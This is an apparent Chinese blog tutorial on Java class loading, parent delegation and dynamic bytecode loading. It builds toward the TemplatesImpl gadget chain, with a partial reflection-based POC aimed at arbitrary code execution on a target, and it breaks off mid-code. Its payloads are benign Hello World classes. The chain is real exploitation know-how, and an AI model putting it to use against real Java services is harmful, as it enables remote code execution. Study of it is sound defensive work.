<p>但是系统程序在启动时，不会一次性加载所有的程序要使用的Class文件到内存中，而是根据程序的需要，通过类加载机制动态将程序要使用的Class文件加载到内存中。只有当class文件杯加载到内存中，才能够被调用。这个机制其实就是类加载机制，也就是classloader（classloader在这里既指类加载器也指类加载机制）。</p>
<p>classloader类的核心方法：</p>
<ol>
<li><code>loadClass</code>（加载指定的Java类）</li>
<li><code>findClass</code>（查找指定的Java类）</li>
<li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li>
<li><code>defineClass</code>（定义一个Java类）</li>
<li><code>resolveClass</code>（链接指定的Java类）</li>
</ol>
<h2 id="classLoader的分类"><a href="#classLoader的分类" class="headerlink" title="classLoader的分类"></a>classLoader的分类</h2><p>在java中，类加载器根据加载类的方式和范围，可以分为以下几种类型：</p>
<p><strong>1、引导类加载器（Bootstrap ClassLoade）</strong>： 它是 JVM 的一部分，是最顶层的类加载器，负责加载 Java 核心类库，如 <code>java.lang.*</code> 等。引导类加载器是用本地代码实现的，无法在 Java 程序中直接获取它的引用。由于它是 JVM 内置的，无需实现，其加载路径为 JVM 的系统类路径（JRE&#x2F;lib&#x2F;*）。</p>
<p><strong>2、扩展类加载器（Extension ClassLoader）</strong>：它是 <code>sun.misc.Launcher$ExtClassLoader</code>，负责加载 Java 扩展目录（jre&#x2F;lib&#x2F;ext）下的类库。Java 扩展目录是 JVM 预定义的，用于存放供 JVM 扩展使用的类库。扩展类加载器的父类加载器是引导类加载器。</p>
<p><strong>3、应用程序类加载器（Application ClassLoader）</strong>： 它是 <code>sun.misc.Launcher$AppClassLoader</code>，也称为系统类加载器。应用程序类加载器负责加载应用程序类路径（CLASSPATH）上指定的类库，包括用户自定义的类和第三方库。应用程序类加载器的父类加载器是扩展类加载器。</p>
<p><strong>4、自定义加载器（Custom ClassLoader）</strong>：开发人员可以通过继承 <code>ClassLoader</code> 类，自定义自己的类加载器。自定义类加载器允许实现特定的类加载需求，例如从网络、数据库或其他来源动态加载类。自定义类加载器需要重写 <code>findClass</code> 方法来定制类的加载逻辑，并通常还会重写 <code>loadClass</code> 方法来实现自定义加载策略。其实也就是用户自定义。</p>
<h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p>上面我们介绍了clasloader的加载器分类：</p>
<p>然后我们这里了解一下类加载的双亲委派</p>
<p>下面我们通过一张图来介绍双亲委派模型：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731160759360.png"
                      alt="image-20230731160759360"
                ></p>
<p><strong>双亲委派机制</strong></p>
<p>分为委托阶段和派发阶段：</p>
<p>委托阶段：</p>
<p>当一个类被加载的时候首先会先判断自己是否已经加载，如果加载了之间返回相应的对象，如果没有被加载，则委托给父类加载器。父类加载器同样也是判断是否加载，同样未加载的话，委托给其父类加载器，直至到达顶层的类加载器引导类加载器（Bootstrap ClassLoade），相应的加载了就返回相应对象，如果直到引导层加载器都未加载成功，说明类未加载，这时就会进入派发阶段，查找并加载类。</p>
<p>派发阶段:</p>
<p>当到达引导类加载器，bootstrapClassLoader 会去对应的目录下（<code>%JAVA_HOME%jre/lib/</code>）搜索该类，找到了就加载类，未能找到就派发给子类加载器进行加载，子类执行的也是执行同样的操作，搜索这个类，有的话加载类，没有继续派发给子类加载器。</p>
<p>根据这个模型我们可以看到最终会到达自定义加载器，如果自定义加载器也未能加载成功就会抛出<code>ClassNotFoundException</code> 异常并退出。</p>
<p>综合来说就是，当我们加载一个类的时候会先判断自己是否加载，加载的话就直接返回，没加载就调用父类加载器，直到引导类加载器都没有加载成功，在调用子类加载器进行加载,直到调用到自定义加载器。</p>
<p>我们这里结合loaderclass代码进行具体分析一下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)</span><br><span class="line">       throws ClassNotFoundException</span><br><span class="line">   &#123;</span><br><span class="line">       synchronized (getClassLoadingLock(name)) &#123;</span><br><span class="line">           // First, check if the class has already been loaded</span><br><span class="line">           Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">           if (c == null) &#123;                                                //双亲委派</span><br><span class="line">               long t0 = System.nanoTime();</span><br><span class="line">               try &#123;</span><br><span class="line">                   if (parent != null) &#123;</span><br><span class="line">                       c = parent.loadClass(name, false);</span><br><span class="line">                   &#125; else &#123;</span><br><span class="line">                       c = findBootstrapClassOrNull(name);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                   // ClassNotFoundException thrown if class not found</span><br><span class="line">                   // from the non-null parent class loader</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               if (c == null) &#123;</span><br><span class="line">                   // If still not found, then invoke findClass in order</span><br><span class="line">                   // to find the class.</span><br><span class="line">                   long t1 = System.nanoTime();</span><br><span class="line">                   c = findClass(name);</span><br><span class="line"></span><br><span class="line">                   // this is the defining class loader; record the stats</span><br><span class="line">                   sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                   sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                   sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">           if (resolve) &#123;</span><br><span class="line">               resolveClass(c);</span><br><span class="line">           &#125;</span><br><span class="line">           return c;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>首先通过findLoadedClass(name）方法检查类是否已经加载了，如果加载了就直接返回，不会重复加载，没有加载就做加载处理，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (c == null) &#123;</span><br><span class="line">     long t0 = System.nanoTime();</span><br><span class="line">     try &#123;</span><br><span class="line">         if (parent != null) &#123;</span><br><span class="line">             c = parent.loadClass(name, false);</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             c = findBootstrapClassOrNull(name);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">         // ClassNotFoundException thrown if class not found</span><br><span class="line">         // from the non-null parent class loader</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>

<p>如果类未被加载，首先优先尝试使用父类加载器即调用 <code>parent.loadClass(name, false)（这里其实也就是双亲委派加载机制）;</code>方法parent是当前加载的父类加载器。同样父类加载器在加载类时也会按同样的方法进行。</p>
<p>如果父类加载器加载成功，返回相应的class对象 c。</p>
<p>如果未加载成功，继续调用父类的父类加载器直到尝试调用引导类加载器，这里即调用<code>findBootstrapClassOrNull(name)</code>，这里关于引导类加载器我们上面有介绍。同样的加载成功返回对象c，如果引导类加载器也未能加载成功，说明类既不在父类加载器中，也不在引导类加载器中，表面类还未加载。</p>
<p>则会调用<code>findClass(name)</code> 方法</p>
<p>我们这里跟进到findclass方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731154334733.png"
                      alt="image-20230731154334733"
                ></p>
<p>我们可以看到findClass方法里面是空的，也就是未定义，其实这里就是要用户自己去定义实现的，也就是我们上面说的用户自定义加载器。如果Classloader中并没有重写findClass方法则会抛出异常。如果重写了findClass方法，则会根据重写的逻辑查找类名，并加载字节码，返回对象的class对象.</p>
<p>优点：避免重复加载某些类，当父加载器已经加载了某个类后，子加载器不会重复加载。<br>            双亲委派模型可以提供类加载的安全性。由于类加载是从上到下依次委派的，子类加载器只有在父类加载器无法加载指定类时才会尝试加载。这样可以避免恶意代码替换系统类，防止不信任的类替代核心类库，提高了系统的安全性。 </p>
<p>下面我们了解一下类加载的具体过程:</p>
<h2 id="类加载的方式"><a href="#类加载的方式" class="headerlink" title="类加载的方式"></a>类加载的方式</h2><p>java虚拟机启动时加载java类文件的两种方式：</p>
<p><strong>1、隐式加载：</strong>隐式加载是指 JVM 在启动时自动加载需要的类到内存中。这些类通常包括 Java 核心类库（如 <code>java.lang.*</code> 等）和一些基础类，它们在 JVM 启动过程中会被预先加载，以确保 JVM 的正常运行。这些类由引导类加载器（Bootstrap ClassLoader）负责加载，它是 JVM 的一部分，是最顶层的类加载器，使用本地代码实现，无法在 Java 程序中直接获取其引用。</p>
<p><strong>2、显式加载：</strong>显式加载是指在 Java 程序运行时通过代码显式地加载类。Java 程序可以使用类加载器（ClassLoader）来加载额外的类，比如用户自定义的类或第三方库。应用程序类加载器（Application ClassLoader）是负责加载应用程序类路径（CLASSPATH）上指定的类库，包括用户自定义的类和第三方库。开发人员也可以通过继承 <code>ClassLoader</code> 类来实现自定义的类加载器，以实现特定的类加载需求。</p>
<p>通过上面的概念我们可以理解为动态加载，即通过反射，或CLassloader动态加载class文件，而隐式加载new类实列，java.lang.Object，基础数据类型的包装类、基于异常数据的包装类等等这些。</p>
<h2 id="类加载的过程"><a href="#类加载的过程" class="headerlink" title="类加载的过程"></a>类加载的过程</h2><p>上面我们了解了类加载的两种方式，下面我们具体分析一下类加载的过程：</p>
<ol>
<li><strong>加载（Loading）：</strong> 加载是类加载的第一个阶段，它是将类的字节码文件（通常是以 <code>.class</code> 后缀的文件）从磁盘或网络加载到内存中的过程。加载过程由类加载器（ClassLoader）来完成。类加载器根据类的全限定名（包括包名和类名）查找类的字节码文件，然后读取字节码文件，并创建对应的 <code>Class</code> 对象。</li>
<li><strong>连接（Linking）：</strong> 连接是类加载的第二个阶段，它包括三个子阶段：验证、准备和解析。<ul>
<li><strong>验证（Verification）：</strong> 在验证阶段，JVM 将对加载的字节码进行验证，以确保字节码是合法、符合规范的。验证阶段主要包括类型检查、字节码验证、符号引用验证等，用于确保字节码的正确性和安全性。</li>
<li><strong>准备（Preparation）：</strong> 在准备阶段，JVM 为类的静态变量（类变量）分配内存，并设置默认初始值。这些静态变量会在类加载完成后被初始化为指定的初始值。注意，实例变量在这个阶段并不会被赋予初值，它们会在对象实例化时进行初始化。</li>
<li><strong>解析（Resolution）：</strong> 在解析阶段，JVM 将符号引用替换为直接引用。符号引用是一种在字节码中使用的符号来表示目标类或方法的引用，而直接引用是指向目标的真实指针或句柄。解析过程将符号引用转换为直接引用，以便在后续的执行中能够直接定位目标类或方法。</li>
</ul>
</li>
<li><strong>初始化（Initialization）：</strong> 初始化是类加载的最后一个阶段，在这个阶段，JVM 执行类的初始化代码，为静态变量赋予正确的初始值，并执行类中定义的静态初始化块。类的初始化是在类加载的最后阶段进行的，只有在真正使用类时才会触发初始化，例如创建类的实例、调用类的静态方法、访问类的静态变量等。初始化阶段可以包括复杂的逻辑和代码，这取决于类的定义和开发人员编写的初始化代码。</li>
</ol>
<h1 id="四、动态加载字节码"><a href="#四、动态加载字节码" class="headerlink" title="四、动态加载字节码"></a>四、动态加载字节码</h1><p>上面我们对classloader进行了学习，然后这里我们正式开始学习java如何动态加载字节码</p>
<h2 id="URLClassLoader加载远程class文件"><a href="#URLClassLoader加载远程class文件" class="headerlink" title="URLClassLoader加载远程class文件"></a>URLClassLoader加载远程class文件</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731165428773.png"
                      alt="image-20230731165428773"
                ></p>
<p>可以看到URLclassloader是继承 SecureClassLoader类的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731165439886.png"
                      alt="image-20230731165439886"
                ></p>
<p>而这里的 SecureClassLoader是继承了CLassloader类的，而且这个URLclassloader是我们上面介绍的应用程序加载器(appclassloader)的父类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731165933112.png"
                      alt="image-20230731165933112"
                ></p>
<p>我们在上面双亲委派机制中说过，会先父类查询父类是否加载，直到引导下型加载器都未加载，开始从引导型加载器开始搜索类进行加载，引导型没有找到，子类进行查找加载，直到自定义加载器。</p>
<p>但是这个搜索是怎么搜索的呢?</p>
<p><strong>以下内容引自P神java安全漫谈</strong></p>
<p>正常情况下，Java会根据配置项 <code>sun.boot.class.path</code> 和 <code>java.class.path</code> 中列举到的基础路径（这<br>些路径是经过处理后的 <code>java.net.URL</code> 类）来寻找<code>.class</code>文件来加载，而这个基础路径有分为三种情况：</p>
<ul>
<li>URL未以斜杠 <code>/</code>结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li>
<li>URL以斜杠 <code>/</code> 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li>
<li>URL以斜杠 <code>/</code>结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li>
</ul>
<p>我们这里通过http协议进行测试：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line">public class HelloClassLoader &#123;</span><br><span class="line">    public static void main( String[] args ) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        URL[] urls = &#123;new URL(&quot;http://localhost:8000/&quot;)&#125;;</span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);</span><br><span class="line">        Class c = loader.loadClass(&quot;Hello&quot;);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编译一个class文件放在服务器所在目录</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Hello &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot;Hello,world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我这里之间在class文件所在开一个服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731171312206.png"
                      alt="image-20230731171312206"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731171405819.png"
                      alt="image-20230731171405819"
                ></p>
<p>可以看到成功加载到远程服务器上面的class文件，并执行了字节码输出了我们定义的helloworld</p>
<h2 id="ClassLoader-defineClass-加载字节码"><a href="#ClassLoader-defineClass-加载字节码" class="headerlink" title="ClassLoader#defineClass() 加载字节码"></a>ClassLoader#defineClass() 加载字节码</h2><p>我们这里在回顾一下双亲委派的实现代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">         if (c == null) &#123;                                                //双亲委派</span><br><span class="line">             long t0 = System.nanoTime();</span><br><span class="line">             try &#123;</span><br><span class="line">                 if (parent != null) &#123;</span><br><span class="line">                     c = parent.loadClass(name, false);</span><br><span class="line">                 &#125; else &#123;</span><br><span class="line">                     c = findBootstrapClassOrNull(name);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                 // ClassNotFoundException thrown if class not found</span><br><span class="line">                 // from the non-null parent class loader</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             if (c == null) &#123;</span><br><span class="line">                 // If still not found, then invoke findClass in order</span><br><span class="line">                 // to find the class.</span><br><span class="line">                 long t1 = System.nanoTime();</span><br><span class="line">                 c = findClass(name);</span><br><span class="line"></span><br><span class="line">                 // this is the defining class loader; record the stats</span><br><span class="line">                 sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                 sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                 sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们在双亲委派中学习了，在加载一个类时首先会先调用<code>findLoadedClass(name)</code>方法检查是否已经加载了对应名称的类，如果未加载会调用父类加载器通过loadclass来加载类</p>
<p>直到顶层加载器都不能加载成功，子类加载器会开始搜索类进行加载，这里使用的就是findclass(name)方法来查找加载类（类似我们上面的URLClassLoader），如果子类也不能加载继续调用子类加载器，直到调用到自定义加载器。当加载到类后会调用defineclass方法，并将字节码的字节数组、类名等信息传递给该方法。<code>defineClass</code> 方法会在 JVM 中将这些字节码转换为一个 Java 类的 <code>Class</code> 类，并将其加入到类加载器的类命名空间中。</p>
<p>其实前面两个loadclass和findclass都是在查找加载类，而defineclass才是真正的核心。</p>
<p>也就是说define将加载的字节码转换为一个java类。</p>
<p>那么根据上面的分析，不论是加载什么class文件都会经历这三个方法的调用：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CLassloader#CLassloader#loadclass======&gt; CLassloader#CLassloader#findclass(name)========&gt;CLassloader#dCLassloader#efineclass</span><br></pre></td></tr></table></figure></div>

<p>我们这里看一下clasLoader类中的defineclass方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)</span><br><span class="line">      throws ClassFormatError</span><br><span class="line">  &#123;</span><br><span class="line">      return defineClass(name, b, off, len, null);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到defineclass是一个受保护的方法，我们不能够直接调用，所以我们如果要外部调用的话，这里要通过反射来获取这个defineclass方法。</p>
<p>接收三个参数，一个字符方法名，一个字节数组，一个偏移量一个长度</p>
<p>示例代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class HelloDefineClass &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);</span><br><span class="line">        defineClass.setAccessible(true);</span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;);</span><br><span class="line">                        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Hello&quot;, code, 0, code.length);</span><br><span class="line">                        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的code就是字节码</p>
<p>ClassLoader.getSystemClassLoader()获取系统类加载器实例，返回一个classloader对象</p>
<p>然后调用sefineclass方法对字节码进行处理转换为java类</p>
<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731180256672.png"
                      alt="image-20230731180256672"
                ></p>
<p>这里要注意的是defineclass被调用的时候，类对象不会被初始化，只有显式调用构造函数，初始化代码才会被执行，而且即使我们的代码放到类的静态代码块中也无法直接被调用到，如果我们要使用 defineClass 在目标机器上执行任意代码，需要想办法调用构造函数。</p>
<h2 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h2><p>上面我们分析了defindclass加载字节码，但是我们defineclass这个方法是受保护的方法，不能够直接被调用，所以这里我们不能够直接调用。</p>
<p>那么我们要想使用这个方法执行任意代码就要向上找调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230731181531200.png"
                      alt="image-20230731181531200"
                ></p>
<p>虽然大多数开发者不会直接使用defineclass方法，但是在java的一些底层方法中还是有调用了defineclass的</p>
<p>我们这里利用的是<code>TemplatesImp</code>l</p>
<p>在<code>TemplatesImp</code>l的TransletClassLoader类中重写了defineclass方法</p>
<p>跟进到</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">static final class TransletClassLoader extends ClassLoader &#123;</span><br><span class="line">    private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">     TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">         super(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        super(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = null;</span><br><span class="line">        // The _loadedExternalExtensionFunctions will be empty when the</span><br><span class="line">        // SecurityManager is not set and the FSP is turned off</span><br><span class="line">        if (_loadedExternalExtensionFunctions != null) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        if (ret == null) &#123;</span><br><span class="line">            ret = super.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        return ret;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Access to final protected superclass member from outer class.</span><br><span class="line">     */</span><br><span class="line">    Class defineClass(final byte[] b) &#123;</span><br><span class="line">        return defineClass(null, b, 0, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而且这里并没有显式的声明其定义域。在java中如果一个方法没有显式的声明作用域，那么其作用域为default。那么这里的defineclass方法就由父类的protected变成了一个default类型的方法。</p>
<p>那么我们就要在<code>TemplatesImp</code>l中看一下哪里调用了defineclass</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731183014046.png"
                      alt="image-20230731183014046"
                ></p>
<p>根据查找用法我们可以在defineTransletClasses()中找到调用</p>
<p>但是这个是一个私有方法，不能直接调用，继续向上找调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731183214197.png"
                      alt="image-20230731183214197"
                ></p>
<p>getTransletInstance()同样是一个私有方法，继续向上找调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731183356861.png"
                      alt="image-20230731183356861"
                ></p>
<p>在newTransformer中可以找到对getTransletInstance()的调用，而且newTransformer是一个公有方法，那么我们这里外部可以直接调用，那么利用链就到这里结束了。</p>
<p>这里给出利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses()-&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></div>

<p>但是这只是利用链，我们要想要利用这条链，就要解决细节部分，写出POC实现利用：<br>我们继续回到newTransformer()的getTransletInstance()</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transformer = new TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">          _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731184214068.png"
                      alt="image-20230731184214068"
                ></p>
<p>根据代码我们可以看到当<code>_name</code>不为空，<code>_class</code>为空时才能够调用defineTransletClasses()方法</p>
<p>但是默认情况下这两个参数都为空</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731184353198.png"
                      alt="image-20230731184353198"
                ></p>
<p>所以我们这里想要调用defineTransletClasses()方法就要修改_name不为空</p>
<p>然后我们在类中可以找到它的构造器:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public TemplatesImpl() &#123; &#125;</span><br></pre></td></tr></table></figure></div>

<p>那么我们这里就可以通过反射去修改属性值：</p>
<p>即：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);//获取class对象后获取定名称 fieldName 的属性的 Field 对象</span><br><span class="line">        field.setAccessible(true);//设置 Field 对象的 accessible 属性为 true使我们可以修改属性值</span><br><span class="line">        field.set(obj,value);//修改值</span><br></pre></td></tr></table></figure></div>

<p>这里由于要修改的很多，所以我们这里直接定义一个方法来简化我们的代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>那么我们的POC为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class ces &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates=new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>继续跟进到defineTransletClasses()：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731190017497.png"
                      alt="image-20230731190017497"
                ></p>
<p>首先这里要求<code>_bytecodes</code>不等于NUll，等于空的话这里就直接抛出异常了</p>
<p>继续向下分析：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">        public Object run() &#123;</span><br><span class="line">            return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这里还有一个run方法：</p>
<p>总的来说，这段代码的目的是通过特权访问控制的方式创建一个 <code>TransletClassLoader</code> 对象，并将其赋值给 <code>loader</code> 变量。</p>
<p>而且跟进getExternalExtensionsMap方法可以发现getExternalExtensionsMap是TransformerFactoryImpl类中的方法：</p>
<p>这里直接构造修改_tfactory的值：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure></div>

<p>然后看调用defineClass的代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">        final int classCount = _bytecodes.length;</span><br><span class="line">        _class = new Class[classCount];</span><br><span class="line"></span><br><span class="line">        if (classCount &gt; 1) &#123;</span><br><span class="line">            _auxClasses = new HashMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            final Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            // Check if this is the main class</span><br><span class="line">            if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">    